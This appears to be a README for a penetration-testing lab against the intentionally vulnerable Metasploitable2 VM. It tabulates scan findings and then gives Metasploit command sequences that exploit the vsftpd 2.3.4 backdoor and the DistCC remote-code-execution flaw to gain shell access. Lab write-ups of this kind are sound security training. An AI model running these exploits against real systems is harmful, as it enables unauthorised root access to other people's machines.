# Penetration Testing on Metasploitable2

## Overview
This project involves conducting penetration testing on the Metasploitable2 virtual machine using **Kali Linux**. The main objective was to identify, analyze and exploit vulnerabilities in web and network services while documenting findings and mitigation strategies.

## Tools Used
- **Metasploitable2**: A vulnerable Linux VM used as the target.
- **Kali Linux**: The attacker machine.
- **Nikto**: Web vulnerability scanner.
- **OpenVAS**: Network vulnerability assessment tool.
- **Metasploit Framework**: Exploitation tool.
- **Nmap**: Network scanner.


## 📊 Vulnerabilities Discovered

### 🔍 **Web Vulnerabilities (Nikto Scan)**
| **Vulnerability** | **CWE ID** | **Description** | **Risk Level** |
|------------------|-----------|----------------|---------------|
| **Clickjacking** | CWE-1021 | X-Frame-Options header missing, allowing UI redress attacks. | Medium |
| **Directory Browsing** | - | Allows browsing of sensitive files that attackers can access. | Medium |

### 🔍 **Network Vulnerabilities (OpenVAS Scan)**
| **Vulnerability** | **CVE ID** | **Description** | **Risk Level** |
|------------------|-----------|----------------|---------------|
| **DistCC Remote Code Execution (RCE)** | CVE-2004-2687 | Attackers can execute arbitrary commands remotely. | High |
| **vsftpd 2.3.4 Backdoor** | CVE-2011-2523 | Backdoor in vsftpd allows unauthorized root access. | Critical |
| **OpenSSL MITM Attack** | CVE-2014-0224 | SSL/TLS vulnerability allowing encrypted traffic interception. | High |

---

## 💻 Exploitation Demonstrations
### **1️⃣ Exploiting vsftpd 2.3.4 Backdoor**
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <Metasploitable_IP>
exploit
whoami  # Confirms root access


### **2️⃣ Exploiting DistCC RCE**
msfconsole
use exploit/unix/misc/distcc_exec
set RHOST <Metasploitable_IP>
set LHOST <Attacker_IP>
exploit
whoami  # Confirms access


